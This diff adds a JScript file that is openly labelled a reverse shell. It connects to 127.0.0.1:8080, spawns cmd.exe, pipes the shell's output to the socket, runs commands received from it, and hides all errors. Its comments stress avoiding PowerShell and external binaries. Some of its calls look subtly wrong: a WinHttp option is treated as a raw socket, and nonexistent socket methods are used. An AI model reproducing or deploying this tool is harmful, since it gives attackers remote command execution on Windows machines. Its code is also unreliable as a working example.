@@ -1,0 +1,81 @@
+// rev_nops.jse - Interactive reverse shell to 127.0.0.1:8080
+// NO PowerShell, NO .bat files, NO external binaries
+(function () {
+    var host = "127.0.0.1";
+    var port = 8080;
+
+    try {
+        // 1. Open raw TCP connection
+        var http = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
+        http.Open("GET", "http://" + host + ":" + port + "/", false);
+        http.SetRequestHeader("User-Agent", "");
+        http.Send();
+
+        var socket = http.Option(4);  // raw socket
+
+        // 2. Spawn cmd.exe
+        var shell = WScript.CreateObject("WScript.Shell");
+        var proc = shell.Exec("cmd.exe");
+
+        // 3. ADODB.Stream for binary I/O
+        var outStream = WScript.CreateObject("ADODB.Stream");
+        outStream.Type = 1; outStream.Open();  // binary
+
+        var inStream = WScript.CreateObject("ADODB.Stream");
+        inStream.Type = 1; inStream.Open();
+
+        // 4. Helper: String → Bytes
+        function strToBytes(str) {
+            var bytes = [];
+            for (var i = 0; i < str.length; i++) {
+                bytes.push(str.charCodeAt(i) & 255);
+            }
+            return bytes;
+        }
+
+        // 5. Helper: Bytes → String
+        function bytesToStr(bytes) {
+            return String.fromCharCode.apply(null, bytes);
+        }
+
+        // 6. Main loop
+        while (true) {
+            try {
+                // --- Read from cmd.exe (stdout + stderr) ---
+                var output = "";
+                try { while (!proc.StdOut.AtEndOfStream) output += proc.StdOut.ReadAll(); } catch(e) {}
+                try { while (!proc.StdErr.AtEndOfStream) output += proc.StdErr.ReadAll(); } catch(e) {}
+
+                if (output) {
+                    var bytes = strToBytes(output);
+                    outStream.Position = 0;
+                    outStream.SetEOS();
+                    outStream.Write(new VBArray(bytes).toArray());
+                    outStream.Position = 0;
+                    socket.Send(outStream.Read(-1));
+                }
+
+                // --- Read from network ---
+                if (socket.DataAvailable > 0) {
+                    var data = socket.Receive(socket.DataAvailable);
+                    var recvBytes = new VBArray(data).toArray();
+                    var input = bytesToStr(recvBytes);
+                    proc.StdIn.Write(input);
+                }
+
+                WScript.Sleep(50);
+
+                // Exit if cmd.exe died
+                try { proc.ExitCode; break; } catch(e) {}
+
+            } catch (e) {
+                break;
+            }
+        }
+    } catch (e) {
+        // silent
+    } finally {
+        try { proc.Terminate(); } catch(e) {}
+        try { socket.Close(); } catch(e) {}
+    }
+})();
